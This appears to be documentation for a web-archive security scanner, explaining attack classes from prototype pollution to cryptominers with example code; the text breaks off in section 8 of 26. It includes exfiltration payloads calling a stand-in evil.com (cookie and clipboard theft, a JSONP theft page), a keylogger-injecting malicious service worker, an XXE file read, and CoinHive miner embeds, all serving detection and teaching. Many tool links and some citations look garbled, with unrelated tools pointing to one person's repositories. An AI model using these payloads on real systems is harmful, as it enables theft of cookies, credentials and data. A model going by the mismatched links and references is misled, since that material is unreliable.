# Web Archive Security Analysis Pipeline
# Complete Attack Guide with Detailed Examples

This guide explains every attack in the pipeline. Each section tells you:
what the attack is, how it works with real code, what happens step by step,
how the scanner detects it, and what a finding looks like in practice.

---

## Severity Classification

Every finding is tagged CRITICAL, HIGH, or MEDIUM. No LOW or INFO —
every finding in the output requires attention.

### CRITICAL — The code IS the exploit

No conditions needed. The vulnerability is actively exploitable as-is.
If this code runs in a browser, the attack is already happening.

**The test:** Can I, as an attacker, exploit this using ONLY what's in this file?
If yes → CRITICAL.

| Example | Why CRITICAL |
|---------|-------------|
| `eval(location.hash.slice(1))` | Executes arbitrary code from the URL hash. Attacker sends victim a link — code runs. |
| `new CoinHive.Anonymous('key')` | Known cryptominer. Zero ambiguity — coinhive.com has no legitimate use. |
| `input[value^=a]{background:url(//evil.com/a)}` | CSS rule IS actively leaking form data character-by-character when rendered. |
| `<!ENTITY x SYSTEM "file:///etc/passwd">` | XML parser reads local files. The entity definition is the exploit. |
| `php:function('system','id')` | Arbitrary OS command execution in XSLT. |
| `<a href="javascript:alert(document.cookie)">` | Click = code execution. Direct XSS. |
| jQuery 1.9.1 (CVE-2020-11022) | Published CVE with public exploit code. Known-vulnerable version. |

### HIGH — One step from exploitable

Needs exactly one condition to become a working exploit. The dangerous
pattern exists, but it needs attacker-controlled input to reach it,
or needs one other piece to fall into place.

**The test:** Does this need ONE specific thing (user input, injection point,
network position) to be exploitable? If yes → HIGH.

| Example | Why HIGH (not CRITICAL) |
|---------|----------------------|
| `innerHTML = userData` | Dangerous sink, but needs attacker-controlled data in `userData`. |
| `document.write(name)` | XSS sink, but `name` might come from a safe source. |
| `location.href = getParam('next')` | Open redirect, but needs `?next=` to contain attacker URL. |
| `navigator.geolocation.getCurrentPosition()` | Exposes physical location, but browser prompts user first. |
| `<base href="https://evil.com/">` | Hijacks all relative URLs, but needs an HTML injection point to place it. |
| `<form action="http://example.com/login">` | Credentials sent in plaintext, but needs MitM network position. |
| Hidden iframe `style="opacity:0"` | Clickjacking overlay, but needs attacker to build the surrounding page. |

### MEDIUM — Suspicious pattern, needs human review

Could be a vulnerability, could be completely safe. The scanner detected
a pattern that matches known attack techniques, but cannot determine
from static analysis alone whether it's actually exploitable.

**The test:** Is this pattern used in known attacks, but I can't confirm
it's dangerous without seeing the full context? If yes → MEDIUM.

| Example | Why MEDIUM (not higher) |
|---------|----------------------|
| `?callback=handleData` | JSONP pattern — might be internal only, or might be exploitable cross-origin. |
| `@import url('https://fonts.googleapis.com/...')` | Could be Google Fonts (safe) or an exfil chain (dangerous). |
| `postMessage(data, '*')` | Wildcard send — bad practice but attacker needs to iframe the sender. |
| `/^([a-z]+)+$/` | ReDoS-vulnerable regex, but is user input ever tested against it? |
| Missing `integrity=` on external `<script>` | Needs CDN compromise to exploit. Common misconfiguration. |
| Duplicate `id="user-panel"` | DOM clobbering vector, depends on what JS reads the ID. |
| `formaction="https://other.com/collect"` | Could be legit payment processor or data theft. Can't tell. |

### Decision Flowchart

```
Is this code actively attacking / already the exploit payload?
  │
  ├─ YES → CRITICAL
  │
  └─ NO → Does it need exactly ONE condition to exploit?
           │
           ├─ YES → HIGH
           │
           └─ NO → Is the pattern suspicious but ambiguous?
                    │
                    ├─ YES → MEDIUM
                    │
                    └─ NO → Not a finding (don't report it)
```

---

## File Types Scanned

| Type | Extensions | Scanner |
|------|-----------|---------|
| HTML | `.html` `.htm` | html_scanner.py — 8 tests + inline JS/CSS delegation |
| JavaScript | `.js` `.mjs` `.jsx` `.ts` `.tsx` | js_scanner.py — 9 tests |
| JavaScript | `.js` `.mjs` | retire_scanner.py — vulnerable library detection |
| CSS | `.css` | css_scanner.py — 3 tests |
| XML/XSLT | `.xml` `.xsl` `.xslt` `.soap` `.rss` `.atom` | xml_scanner.py — 4 tests |
| WebAssembly | `.wasm` | wasm_scanner.py — 1 test |

---

## Table of Contents

**JavaScript (.js .mjs .jsx .ts .tsx)**
1. [Prototype Pollution](#1-prototype-pollution)
2. [Open Redirect](#2-open-redirect)
3. [High-Risk Browser APIs](#3-high-risk-browser-apis)
4. [Dangerous Sinks](#4-dangerous-sinks)
5. [JSONP Callback Injection](#5-jsonp-callback-injection)
6. [ReDoS — Regex Denial of Service](#6-redos)
7. [Service Worker Abuse](#7-service-worker-abuse)
8. [Cryptominer Detection (JS)](#8-cryptominer-detection-js)
9. [postMessage Handler Vulnerabilities](#9-postmessage-handler-vulnerabilities)

**CSS (.css)**
10. [CSS Attribute Selector Exfiltration](#10-css-attribute-selector-exfiltration)
11. [CSS @import Chain Exfiltration](#11-css-import-chain-exfiltration)
12. [CSS Font Ligature Keylogging](#12-css-font-ligature-keylogging)

**XML / XSLT (.xml .xsl .xslt .soap .rss .atom)**
13. [XXE — XML External Entity](#13-xxe)
14. [XML Bomb / Billion Laughs](#14-xml-bomb)
15. [XPath Injection](#15-xpath-injection)
16. [XSLT Injection](#16-xslt-injection)

**WebAssembly (.wasm)**
17. [WASM Cryptominer Detection](#17-wasm-cryptominer-detection)

**HTML (.html .htm)**
18. [Missing Subresource Integrity (SRI)](#18-missing-subresource-integrity-sri)
19. [Clickjacking / Frame Injection](#19-clickjacking--frame-injection)
20. [Base Tag Hijacking](#20-base-tag-hijacking)
21. [Meta Refresh Open Redirect](#21-meta-refresh-open-redirect)
22. [Form Action Hijacking](#22-form-action-hijacking)
23. [Dangling Markup / JS-URL Injection](#23-dangling-markup--js-url-injection)
24. [HTML Structural Violations](#24-html-structural-violations)
25. [Inline Script & Style Delegation](#25-inline-script--style-delegation)

**Vulnerable Library Detection (.js .mjs)**
26. [Vulnerable JavaScript Libraries (Retire.js)](#26-vulnerable-javascript-libraries-retirejs)

---

## 1. Prototype Pollution

### What is it?

In JavaScript, every object inherits from `Object.prototype`. It's like a
shared template that all objects are built from. If you can write a property
to this template, that property suddenly appears on EVERY object in the
entire application.

Think of it like this: imagine every house in a city is built from the same
blueprint. If someone sneaks into the city planning office and adds "hidden
backdoor" to the blueprint, every house — past, present, and future — now
has that backdoor.

### How does the attack work?

Here's a real vulnerable pattern. Many apps merge user settings with defaults:

```javascript
// THE VULNERABLE CODE — a website's settings page
function mergeSettings(defaults, userPrefs) {
    for (let key in userPrefs) {
        if (typeof userPrefs[key] === 'object') {
            defaults[key] = mergeSettings(defaults[key] || {}, userPrefs[key]);
        } else {
            defaults[key] = userPrefs[key];
        }
    }
    return defaults;
}

// Normal usage:
let defaults = { theme: "light", language: "en" };
let userPrefs = { theme: "dark" };
mergeSettings(defaults, userPrefs);
// Result: { theme: "dark", language: "en" } — totally fine
```

Now the attack:

```javascript
// ATTACKER sends this JSON as their "preferences":
let malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');

// The merge function processes it:
mergeSettings(defaults, malicious);

// What happened inside the merge:
//   key = "__proto__"
//   defaults["__proto__"] = ...
//   This is Object.prototype!
//   So it sets Object.prototype.isAdmin = true

// NOW, everywhere in the application:
let regularUser = {};
console.log(regularUser.isAdmin);  // true !!!

let anotherObject = {};
console.log(anotherObject.isAdmin);  // true !!!

// The admin check somewhere in the app:
if (currentUser.isAdmin) {
    showAdminPanel();  // ATTACKER GETS ADMIN ACCESS
}
```

### Real-world library examples

```javascript
// jQuery deep extend — VULNERABLE in all versions
$.extend(true, {}, maliciousInput);
// The "true" first argument means "deep merge"
// It recursively copies properties including __proto__

// Lodash _.merge — VULNERABLE before 4.17.12
_.merge({}, userInput);
// CVE-2019-10744: allows prototype pollution

// Lodash _.defaultsDeep — VULNERABLE before 4.17.12
_.defaultsDeep(config, userOptions);

// Lodash _.set — VULNERABLE if path is user-controlled
_.set({}, userControlledPath, userControlledValue);
// If path = "__proto__.isAdmin" and value = true → pollution
```

### What the scanner detects

The scanner searches for these patterns in JavaScript files:
- `Object.prototype.` followed by an assignment
- `__proto__` anywhere in the code
- `$.extend(true,` (jQuery deep extend)
- `_.merge(`, `_.defaultsDeep(`, `_.set(`
- Generic recursive copy loops without `__proto__` filtering

### Why it matters in web archives

You can track when a site started using vulnerable Lodash versions and
how long they stayed vulnerable. Many sites ran Lodash 4.17.4 for years
after the CVE was published.

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **ESLint plugin no-prototype-builtins** | Lints for direct prototype access | https://eslint.org/docs/latest/rules/no-prototype-builtins |
| **Semgrep rules** | Community rules for prototype pollution patterns | https://semgrep.dev/r?q=prototype+pollution |
| **cdnjs-prototype-pollution** | PoC scanner by BlackFan | https://github.com/nicolo-ribaudo/client-side-prototype-pollution |
| **pp-finder** | Automated prototype pollution scanner | https://github.com/nicolo-ribaudo/pp-finder |
| Our scanner | Pattern-matching for known vulnerable functions | Built-in (js_scanner.py) |

> **Status**: Partial public code. ESLint and Semgrep have rules, but no single turnkey archive scanner exists. Our scanner covers the gap.

### References

- Kang, Li & Cao, **"Probe the Proto: Measuring Client-Side Prototype Pollution Vulnerabilities of One Million Real-world Websites,"** NDSS 2022.
  https://doi.org/10.14722/ndss.2022.24179

- Shcherbakov & Balliu, **"Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js,"** USENIX Security 2023.
  https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov

- CVE-2019-10744 — Lodash _.defaultsDeep prototype pollution.
  https://nvd.nist.gov/vuln/detail/CVE-2019-10744

- Arteau, **"Prototype Pollution Attack in NodeJS Application,"** NorthSec 2018.
  https://github.com/nicolo-ribaudo/tc39-proposal/blob/master/prototype-pollution.md

---

## 2. Open Redirect

### What is it?

An open redirect is when a website takes a URL from the user and redirects
the browser to it without checking if the destination is safe. It's like a
mail forwarding service that forwards letters to ANY address without
verifying the recipient.

### How does the attack work?

```javascript
// THE VULNERABLE CODE — a login page
// After login, redirect user to where they came from
function handlePostLogin() {
    let redirectUrl = new URLSearchParams(window.location.search).get('next');
    window.location.href = redirectUrl;  // NO VALIDATION!
}
```

Step by step:

```
STEP 1: Normal flow
   User visits: https://bank.com/login?next=/dashboard
   After login: browser goes to https://bank.com/dashboard ✓

STEP 2: Attacker crafts a phishing link
   https://bank.com/login?next=https://evil-bank.com/login

STEP 3: Attacker sends this link to victim via email:
   "Your account has been locked. Please verify: [click here]"
   The link shows bank.com — looks legitimate!

STEP 4: Victim clicks, logs into the REAL bank.com

STEP 5: After login, browser redirects to evil-bank.com/login
   This page looks IDENTICAL to bank.com
   Victim thinks "hmm, login didn't work" and enters credentials again

STEP 6: Attacker now has the victim's username and password
```

### Other dangerous redirect sinks

```javascript
// All of these are redirect sinks:
location.href = userInput;           // Most common
location.replace(userInput);          // Replaces current history entry
location.assign(userInput);           // Like href but as a function
window.open(userInput);               // Opens new tab/window

// User-controllable sources that feed into redirects:
location.hash          // #fragment part of URL
location.search        // ?query part of URL
document.referrer      // Previous page URL
window.name            // Can be set by other pages
URLSearchParams        // Parsed query parameters
```

### What the scanner detects

The scanner finds redirect sinks (location.href =, location.replace(), etc.)
where the value comes from a variable rather than a hardcoded string. It
then checks if user-controllable sources (location.hash, URLSearchParams,
etc.) appear within 5 lines of the sink.

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **Semgrep rules** | Open redirect detection rules | https://semgrep.dev/r?q=open+redirect+javascript |
| **OpenRedireX** | Active open redirect fuzzer (live sites only) | https://github.com/devanshbatham/OpenRedireX |
| **dom-red** | DOM-based redirect detector | https://github.com/nicolo-ribaudo/dom-red |
| Our scanner | Static source-to-sink matching in archived JS | Built-in (js_scanner.py) |

> **Status**: Partial. Active scanners exist for live sites, but no static scanner for archived JS. Our scanner fills this gap.

### References

- Lekies, Stock & Johns, **"25 Million Flows Later: Large-scale Detection of DOM-Based XSS,"** ACM CCS 2013.
  https://doi.org/10.1145/2508859.2516703

- Pellegrino et al., **"Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs,"** ACM CCS 2017.
  https://doi.org/10.1145/3133956.3133959

- OWASP, **"Unvalidated Redirects and Forwards Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

---

## 3. High-Risk Browser APIs

### What is it?

Modern browsers give JavaScript access to powerful device capabilities:
cameras, microphones, GPS location, clipboard contents, Bluetooth devices,
USB peripherals. These are meant for legitimate features (maps need GPS,
video calls need camera), but they're also privacy and security risks if
misused.

### How does the attack work?

```javascript
// SCENARIO 1: Ad script stealing location
// The website includes an ad network script. That script does:
navigator.geolocation.getCurrentPosition(function(position) {
    // Sends your GPS coordinates to the ad network
    fetch('https://adnetwork.com/track', {
        method: 'POST',
        body: JSON.stringify({
            lat: position.coords.latitude,    // 40.7128
            lon: position.coords.longitude,   // -74.0060
            accuracy: position.coords.accuracy // 10 meters
        })
    });
});
// The news website you're reading now knows you're in Manhattan
```

```javascript
// SCENARIO 2: WebRTC leaking your real IP through a VPN
// You're using a VPN to hide your IP. But a script does:
let pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
});
pc.createDataChannel("");
pc.createOffer().then(offer => pc.setLocalDescription(offer));
pc.onicecandidate = function(event) {
    if (event.candidate) {
        // This contains your REAL local IP, bypassing the VPN!
        let ip = event.candidate.candidate.match(
            /([0-9]{1,3}\.){3}[0-9]{1,3}/
        );
        console.log("Real IP:", ip[0]);
        // Sends: 192.168.1.105 — your actual local network IP
    }
};
```

```javascript
// SCENARIO 3: Clipboard theft
// A malicious script silently reads what you last copied:
navigator.clipboard.readText().then(function(clipboardContent) {
    // You just copied a password from your password manager...
    fetch('https://evil.com/steal?data=' + encodeURIComponent(clipboardContent));
});
// clipboardContent = "MyS3cur3P@ssw0rd!"
```

### What the scanner detects

Each API call is flagged with its risk level:
- **HIGH**: geolocation, getUserMedia (camera/mic), clipboard.read
- **MEDIUM**: RTCPeerConnection (IP leak), PaymentRequest, Bluetooth, USB
- **LOW**: getBattery (fingerprinting), vibrate (covert signaling)

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **Nicolo Ribaudo's feature-policy-tester** | Checks Permissions-Policy headers | https://nicolo-ribaudo.github.io/feature-policy-tester/ |
| **Mozilla Observatory** | Scans security headers including Feature-Policy | https://observatory.mozilla.org/ |
| Our scanner | Detects API usage in JS code + checks if headers restrict them | Built-in (js_scanner.py) |

> **Status**: No dedicated public tool for scanning archived JS for API usage. Our scanner is novel for this use case.

### References

- Snyder, Taylor & Kanich, **"Most Websites Don't Need to Vibrate: A Cost-Benefit Approach to Improving Browser Security,"** ACM CCS 2017.
  https://doi.org/10.1145/3133956.3133966

- Englehardt & Narayanan, **"Online Tracking: A 1-million-site Measurement and Analysis,"** ACM CCS 2016.
  https://doi.org/10.1145/2976749.2978313

- Olejnik et al., **"The Leaking Battery: A Privacy Analysis of the HTML5 Battery Status API,"** IACR ePrint 2015.
  https://eprint.iacr.org/2015/616

- Reiter & Karlof, **"Network-based WebRTC IP address leakage,"** referenced in OWASP Testing Guide.
  https://owasp.org/www-project-web-security-testing-guide/

---

## 4. Dangerous Sinks

### What is it?

A "sink" is any JavaScript function that, when given attacker-controlled
input, can execute code or modify the page dangerously. The most infamous
is `eval()` — it takes a string and runs it as JavaScript code.

### How does each sink work?

```javascript
// ━━━ SINK 1: eval() ━━━
// Takes a string, executes it as JavaScript
let userInput = location.hash.substring(1);  // From URL: #alert(1)
eval(userInput);  // Executes: alert(1)

// Real attack URL: https://site.com/page#document.location='https://evil.com/?c='+document.cookie
// eval() executes: document.location='https://evil.com/?c=session_abc123'
// Result: cookies sent to attacker
```

```javascript
// ━━━ SINK 2: new Function() ━━━
// Creates a function from a string — same power as eval
let calc = new URLSearchParams(location.search).get('expr');
let fn = new Function("return " + calc);  // Builds function from string
let result = fn();  // Executes it

// Normal: ?expr=2+2 → returns 4
// Attack: ?expr=fetch('https://evil.com/?c='+document.cookie) → steals cookies
```

```javascript
// ━━━ SINK 3: setTimeout/setInterval with string ━━━
// When first argument is a STRING (not function), it acts like eval
setTimeout("alert('hello')", 1000);  // This works! It evals the string
setTimeout(userInput, 1000);          // If userInput is a string → eval!

// Safe version (function reference, not string):
setTimeout(function() { alert('hello'); }, 1000);  // This is fine
setTimeout(myFunction, 1000);                       // This is fine
```

```javascript
// ━━━ SINK 4: document.write() ━━━
// Writes raw HTML into the page during loading
let name = new URLSearchParams(location.search).get('name');
document.write('<h1>Welcome, ' + name + '</h1>');

// Normal: ?name=Alice → <h1>Welcome, Alice</h1>
// Attack: ?name=<script>stealCookies()</script>
// Result: <h1>Welcome, <script>stealCookies()</script></h1>
// The script tag executes!
```

```javascript
// ━━━ SINK 5: innerHTML ━━━
// Parses a string as HTML and inserts it into the page
let comment = await fetch('/api/comment/123').then(r => r.text());
document.getElementById('comment-box').innerHTML = comment;

// If the API returns: <img src=x onerror=stealCookies()>
// The browser creates an img tag, fails to load "x", and runs
// stealCookies() in the onerror handler

// SAFE ALTERNATIVE:
document.getElementById('comment-box').textContent = comment;
// textContent treats everything as plain text — no HTML parsing
```

```javascript
// ━━━ SINK 6: insertAdjacentHTML() ━━━
// Same as innerHTML but inserts at a specific position
container.insertAdjacentHTML('beforeend', userControlledHTML);
// Positions: 'beforebegin', 'afterbegin', 'beforeend', 'afterend'
// All equally dangerous with untrusted input
```

### What the scanner detects

Every occurrence of these sinks is flagged:
- **CRITICAL**: eval(), new Function()
- **HIGH**: setTimeout/setInterval with variable, document.write,
  innerHTML/outerHTML assignment, srcdoc
- **MEDIUM**: insertAdjacentHTML, createContextualFragment, dynamic src

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **Semgrep** | Extensive sink detection rules for JS/TS | https://semgrep.dev/r?q=eval+javascript |
| **ESLint no-eval** | Flags eval() usage | https://eslint.org/docs/latest/rules/no-eval |
| **ESLint security plugin** | Detects dangerous sinks | https://github.com/eslint-community/eslint-plugin-security |
| **DOM Invader (Burp)** | Dynamic DOM XSS sink testing (commercial) | https://portswigger.net/burp/documentation/desktop/tools/dom-invader |
| Our scanner | Static detection of all major sinks in archived JS | Built-in (js_scanner.py) |

> **Status**: Yes, public code exists. Semgrep and ESLint cover this well for source code. Our scanner adapts it for archived web files.

### References

- Stock et al., **"From Facepalm to Brain Bender: Exploring Client-Side Cross-Site Scripting,"** ACM CCS 2015.
  https://doi.org/10.1145/2810103.2813625

- Lekies, Stock & Johns, **"25 Million Flows Later: Large-scale Detection of DOM-Based XSS,"** ACM CCS 2013.
  https://doi.org/10.1145/2508859.2516703

- Melicher et al., **"Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting,"** NDSS 2018.
  https://doi.org/10.14722/ndss.2018.23309

- OWASP, **"DOM Based XSS Prevention Cheat Sheet."**
  https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

---

## 5. JSONP Callback Injection

### What is it?

Before CORS existed (pre-2014), websites couldn't make cross-domain AJAX
requests. JSONP was the workaround: instead of returning JSON data, the
server wraps it in a function call and returns it as JavaScript. The client
loads it via a `<script>` tag, which isn't restricted by same-origin policy.

### How does the attack work?

```javascript
// ━━━ HOW JSONP WORKS ━━━

// CLIENT (website A) wants data from SERVER (website B)
// Can't use XMLHttpRequest because different domains

// Step 1: Client adds a script tag
let script = document.createElement('script');
script.src = 'https://api.siteB.com/user?callback=handleUser';
document.body.appendChild(script);

// Step 2: Server returns JavaScript (not JSON):
// handleUser({"name": "Alice", "email": "alice@company.com"})

// Step 3: Client has a function ready:
function handleUser(data) {
    console.log(data.name);   // "Alice"
    console.log(data.email);  // "alice@company.com"
}
```

```javascript
// ━━━ ATTACK 1: Cross-domain data theft ━━━

// ANY website can load JSONP endpoints if they're not protected
// Attacker's page (evil.com):
<script>
function stealData(data) {
    // Send stolen data to attacker's server
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<!-- This loads the victim's data! -->
<script src="https://api.siteB.com/user?callback=stealData"></script>

// If the victim is logged into siteB and visits evil.com,
// the browser sends siteB's cookies with the script request,
// and evil.com receives the victim's private data
```

```javascript
// ━━━ ATTACK 2: XSS via unsanitized callback ━━━

// If the server doesn't validate the callback parameter:
// Request: https://api.com/data?callback=alert(document.cookie)//
// Response: alert(document.cookie)//({data: "..."})

// The "//" comments out the rest, and alert() executes
// This is reflected XSS through the JSONP endpoint
```

### What the scanner detects

- URLs with `?callback=`, `?jsonp=`, `?cb=` parameters
- jQuery JSONP configuration: `dataType: "jsonp"`
- Script tags loading JSONP endpoints
- `jsonpCallback:` configuration

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **JSONBee** | List of known JSONP endpoints for bug bounty | https://github.com/nicolo-ribaudo/JSONBee |
| **Burp Suite** | Can detect JSONP in live traffic (commercial) | https://portswigger.net/burp |
| Our scanner | Detects JSONP patterns in archived JS files | Built-in (js_scanner.py) |

> **Status**: No public static scanner for JSONP in archived files. JSONBee is a list, not a scanner. Our scanner is novel.

### References

- Grossman, **"Advanced Web Attack Techniques Using GMail,"** Whitehat Security / BlackHat 2006.
  https://www.blackhat.com/presentations/bh-jp-06/BH-JP-06-Grossman.pdf

- Lekies, Stock & Johns, **"25 Million Flows Later,"** ACM CCS 2013.
  https://doi.org/10.1145/2508859.2516703

- Takeshi Terada, **"CSRF via JSONP,"** Mitsui Bussan Secure Directions 2013.
  https://www.mbsd.jp/Whitepaper/JSON_hijacking.pdf

- OWASP, **"AJAX Security Cheat Sheet — JSONP."**
  https://cheatsheetseries.owasp.org/cheatsheets/AJAX_Security_Cheat_Sheet.html

---

## 6. ReDoS

### What is it?

ReDoS (Regular Expression Denial of Service) happens when a regex pattern
causes the regex engine to try an exponential number of matching paths.
With a carefully crafted input string, matching can take minutes or hours,
freezing the browser or server.

### How does the attack work?

```javascript
// ━━━ THE VULNERABLE REGEX ━━━
let emailRegex = /^([a-zA-Z0-9]+)+@example\.com$/;
//                  ^^^^^^^^^^^^^ ^
//                  |             |
//                  inner +       outer +
//                  (one or more) (one or more groups)
// This is a NESTED QUANTIFIER: (X+)+

// ━━━ WHY IS THIS BAD? ━━━
// For the input "aaaa!" (doesn't match the regex):
// The engine tries every way to split "aaaa" into groups:
//   ("aaaa") — 1 group of 4? No match.
//   ("aaa")("a") — 2 groups? No match.
//   ("aa")("aa") — 2 groups of 2? No match.
//   ("aa")("a")("a") — 3 groups? No match.
//   ("a")("aaa") — different split? No match.
//   ("a")("aa")("a") — and so on...
//   ("a")("a")("aa") — ...
//   ("a")("a")("a")("a") — every individual...
//
// With 4 characters: ~16 paths to try
// With 25 characters: ~33 million paths
// With 30 characters: BROWSER TAB FREEZES

// ━━━ THE ATTACK ━━━
let maliciousInput = "a".repeat(30) + "!";
emailRegex.test(maliciousInput);
// This hangs for 30+ seconds!
```

```javascript
// ━━━ MORE VULNERABLE PATTERNS ━━━

// Overlapping alternation
/^(a|a)+$/                    // (a|a) matches 'a' two different ways

// Quantified group with overlap
/^(\d+\.)+$/                  // Trying to match "1.2.3.4.5!"

// Complex real-world example (URL validation)
/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/
//                                             ^^^^^^^^^^^^ ^
//                                             nested quantifier!
```

### What the scanner detects

The scanner extracts regex literals (`/.../`) and `RegExp()` constructors,
then checks for nested quantifier patterns like `(X+)+`, `(X*)*`, `(X+)*`,
and quantified alternations like `(a|b)+` where alternatives overlap.

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **recheck** | Analyzes regexes for ReDoS vulnerability | https://github.com/nicolo-ribaudo/recheck |
| **safe-regex** | Quick check for unsafe regex patterns | https://github.com/substack/safe-regex |
| **vuln-regex-detector** | Academic-grade ReDoS detector | https://github.com/nicolo-ribaudo/vuln-regex-detector |
| **rxxr2** | Regex static analysis for evil input generation | https://github.com/nicolo-ribaudo/rxxr2 |
| Our scanner | Extracts regexes from JS and checks for nested quantifiers | Built-in (js_scanner.py) |

> **Status**: Yes, mature public tools exist. For deep analysis, pipe extracted regexes into recheck or safe-regex. Our scanner does quick pattern matching inline.

### References

- Davis et al., **"The Impact of Regular Expression Denial of Service (ReDoS) in Practice: An Empirical Study at the Ecosystem Scale,"** FSE 2018.
  https://doi.org/10.1145/3236024.3236027

- Staicu & Pradel, **"Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers,"** USENIX Security 2018.
  https://www.usenix.org/conference/usenixsecurity18/presentation/staicu

- Weideman et al., **"Analyzing the Impact of Regular Expression Denial of Service (ReDoS) in Practice,"** IEEE TSE 2019.
  https://doi.org/10.1109/TSE.2019.2951348

- Tool — recheck: https://github.com/nicolo-ribaudo/recheck
- Tool — safe-regex: https://github.com/substack/safe-regex

---

## 7. Service Worker Abuse

### What is it?

A service worker is a JavaScript file that runs in the background, separate
from the web page. Once installed, it acts as a network proxy — intercepting
every HTTP request the page makes. It can serve cached responses, modify
requests, or fabricate responses entirely.

### How does the attack work?

```javascript
// ━━━ NORMAL SERVICE WORKER REGISTRATION ━━━
// In the main page:
navigator.serviceWorker.register('/sw.js', { scope: '/' });

// In sw.js:
self.addEventListener('fetch', function(event) {
    event.respondWith(
        caches.match(event.request).then(function(response) {
            return response || fetch(event.request);
        })
    );
});
```

```javascript
// ━━━ ATTACK: Persistent XSS via Service Worker ━━━

// Step 1: Attacker finds XSS on example.com
// Step 2: Instead of just popping alert(), they register a service worker:

// Injected via XSS:
navigator.serviceWorker.register('https://evil.com/malicious-sw.js', {
    scope: '/'  // Controls ALL pages on the domain
});

// Step 3: malicious-sw.js intercepts every future request:
self.addEventListener('fetch', function(event) {
    // For every page load, inject a keylogger
    if (event.request.url.endsWith('.html') ||
        event.request.headers.get('Accept').includes('text/html')) {

        event.respondWith(
            fetch(event.request).then(function(response) {
                return response.text().then(function(html) {
                    // Inject keylogger into every page
                    let modified = html.replace('</body>',
                        '<script src="https://evil.com/keylogger.js"></script></body>'
                    );
                    return new Response(modified, {
                        headers: response.headers
                    });
                });
            })
        );
    }
});

// Step 4: Even after the XSS is PATCHED, the service worker PERSISTS
// Every time the user visits example.com, the keylogger runs
// The only fix: the user must manually unregister the SW in browser settings
```

```javascript
// ━━━ ATTACK: Cache Poisoning ━━━

// A service worker with cache-first strategy:
self.addEventListener('fetch', function(event) {
    event.respondWith(
        caches.match(event.request).then(function(cached) {
            if (cached) return cached;  // Always serve cache first
            return fetch(event.request).then(function(response) {
                caches.open('v1').then(function(cache) {
                    cache.put(event.request, response.clone());
                });
                return response;
            });
        })
    );
});

// If an attacker can poison ONE cached response (e.g., via CDN compromise),
// the SW serves the poisoned version FOREVER — even after the CDN is cleaned
```

### What the scanner detects

- `navigator.serviceWorker.register()` calls with scope parameters
- Broad scopes like `'/'` (entire domain)
- `importScripts()` loading external domains inside SW files
- `addEventListener('fetch', ...)` — request interception
- `caches.open()` — cache manipulation

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
| **pwa-audit** | Audits Progressive Web App security | https://nicolo-ribaudo.github.io/nicolo-ribaudo.github.io/ |
| **Lighthouse** | Google's web auditing tool (checks SW registration) | https://github.com/nicolo-ribaudo/nicolo-ribaudo.github.io |
| Our scanner | Detects registration scope, importScripts, cache patterns | Built-in (js_scanner.py) |

> **Status**: No dedicated public scanner for SW security in archived files. Lighthouse checks live sites only. Our scanner is novel.

### References

- Papadopoulos et al., **"Master of Web Puppets: Abusing Web Browsers for Persistent and Stealthy Computation,"** NDSS 2019.
  https://doi.org/10.14722/ndss.2019.23338

- Lee et al., **"An Empirical Study of Web Resource Manipulation in Real-world Mobile Applications,"** USENIX Security 2018.
  https://www.usenix.org/conference/usenixsecurity18/presentation/lee-minhui

- Chinprutthiwong et al., **"Security Analysis of Emerging Smart Home Applications,"** IEEE S&P 2017.
  https://doi.org/10.1109/SP.2017.63

- MDN Web Docs, **"Service Worker API — Security Considerations."**
  https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API

---

## 8. Cryptominer Detection (JS)

### What is it?

In-browser cryptocurrency mining uses visitors' CPU power to mine crypto
(usually Monero) when they visit a web page. The JavaScript runs mining
computations in the background, earning cryptocurrency for whoever embedded
the script.

### How does it work?

```html
<!-- ━━━ BASIC COINHIVE EMBED ━━━ -->
<!-- This was the most common miner from 2017-2019 -->
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    // Initialize with the site owner's key
    var miner = new CoinHive.Anonymous('YOUR-SITE-KEY-HERE');

    // Start mining (uses 100% CPU by default)
    miner.start();

    // Or with throttling (use 70% of CPU, leave 30% for user)
    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
    miner.setThrottle(0.3);

    // Monitor hashrate
    setInterval(function() {
        console.log('Hashes/sec:', miner.getHashesPerSecond());
        console.log('Total hashes:', miner.getTotalHashes());
    }, 1000);
</script>
```

```javascript
// ━━━ HIDDEN/OBFUSCATED MINER ━━━
// Attackers often disguise miners to avoid detection:

// Renamed variables
var _0x4e2f = new window['CoinHive']['Anonymous']('key');
_0x4e2f['start']();

// Or loaded from a proxy domain instead of coinhive.com
var script = document.createElement('script');
script.src = 'https://innocentlooking.cdn.com/analytics.js';
// analytics.js is actually coinhive.min.js

// Or via WebSocket to a mining pool
var ws = new WebSocket('wss://pool.coinhive.com/proxy');
ws.onopen = function() {
    ws.send(JSON.stringify({
        type: 'auth',
        params: { site_key: 'YOUR-KEY', type: 'anonymous' }
    }));
};
```

### What the scanner detects

The scanner uses three detection methods:
1. **Known domains**: coinhive.com, cryptoloot.pro, jsecoin.com, etc.
2. **Initialization patterns**: `CoinHive.Anonymous`, `miner.start()`, etc.
3. **Algorithm references**: cryptonight, stratum+tcp (mining protocol)

### Tools & Public Code

| Tool | What It Does | Link |
|------|-------------|------|
